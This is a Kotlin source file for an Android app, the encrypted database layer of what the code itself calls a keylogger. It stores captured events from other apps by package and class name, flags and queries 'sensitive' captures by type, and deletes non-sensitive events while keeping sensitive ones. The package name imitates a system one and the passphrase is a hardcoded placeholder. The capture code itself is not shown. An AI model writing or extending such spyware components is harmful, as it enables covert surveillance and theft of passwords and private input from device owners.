package com.android.myapp.data

import android.content.Context
import androidx.room.*
import net.zetetic.database.sqlcipher.SupportOpenHelperFactory

@Database(
    entities = [CapturedEvent::class, Session::class],
    version = 1,
    exportSchema = false
)
abstract class KeyloggerDatabase : RoomDatabase() {

    abstract fun capturedEventDao(): CapturedEventDao
    abstract fun sessionDao(): SessionDao

    companion object {
        @Volatile
        private var INSTANCE: KeyloggerDatabase? = null

        fun getInstance(context: Context): KeyloggerDatabase {
            return INSTANCE ?: synchronized(this) {
                val instance = buildDatabase(context)
                INSTANCE = instance
                instance
            }
        }

        private fun buildDatabase(context: Context): KeyloggerDatabase {
            val passphrase: ByteArray = "your-pass".toByteArray(Charsets.UTF_8)
            val factory = SupportOpenHelperFactory(passphrase)

            return Room.databaseBuilder(
                context.applicationContext,
                KeyloggerDatabase::class.java,
                "keylogger_encrypted.db"
            )
                .openHelperFactory(factory)
                .fallbackToDestructiveMigration()
                .build()
        }
    }

    fun deleteDatabase(context: Context): Boolean {
        // 1) Close Room instance (important!)
        synchronized(this) {
            INSTANCE?.close()
            INSTANCE = null
        }

        // 2) Delete the DB file (also removes -shm / -wal when applicable)
        return context.applicationContext.deleteDatabase("keylogger_encrypted.db")
    }
}

@Dao
interface CapturedEventDao {

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(event: CapturedEvent): Long

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(events: List<CapturedEvent>)

    @Query("SELECT * FROM captured_events ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getRecent(limit: Int = 100): List<CapturedEvent>

    @Query("SELECT * FROM captured_events WHERE isSensitive = 1 ORDER BY timestamp DESC")
    suspend fun getSensitiveEvents(): List<CapturedEvent>

    @Query("SELECT * FROM captured_events WHERE packageName = :packageName ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getEventsByPackage(packageName: String, limit: Int = 100): List<CapturedEvent>

    @Query("SELECT * FROM captured_events WHERE className = :className ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getEventsByClassName(className: String, limit: Int = 100): List<CapturedEvent>

    @Query("SELECT * FROM captured_events WHERE timestamp BETWEEN :startTime AND :endTime")
    suspend fun getEventsByTimeRange(startTime: Long, endTime: Long): List<CapturedEvent>

    @Query("SELECT * FROM captured_events WHERE sensitivityType = :type ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getEventsBySensitivityType(type: String, limit: Int = 100): List<CapturedEvent>

    @Query("DELETE FROM captured_events WHERE timestamp < :timestamp")
    suspend fun deleteOldEvents(timestamp: Long): Int

    @Query("DELETE FROM captured_events WHERE isSensitive = 0")
    suspend fun deleteNonSensitiveEvents(): Int

    @Query("DELETE FROM captured_events")
    suspend fun deleteAll()

    @Query("SELECT COUNT(*) FROM captured_events")
    suspend fun getCount(): Int

    @Query("SELECT COUNT(*) FROM captured_events WHERE isSensitive = 1")
    suspend fun getSensitiveCount(): Int
}

@Dao
interface SessionDao {

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(session: Session): Long

    @Update
    suspend fun update(session: Session)

    @Query("SELECT * FROM sessions ORDER BY startTime DESC LIMIT :limit")
    suspend fun getRecentSessions(limit: Int = 50): List<Session>

    @Query("SELECT * FROM sessions WHERE id = :id")
    suspend fun getSessionById(id: Long): Session?

    @Query("SELECT * FROM sessions WHERE endTime IS NULL ORDER BY startTime DESC LIMIT 1")
    suspend fun getActiveSession(): Session?

    @Query("DELETE FROM sessions WHERE startTime < :timestamp")
    suspend fun deleteOldSessions(timestamp: Long): Int

    @Query("DELETE FROM sessions")
    suspend fun deleteAll()
}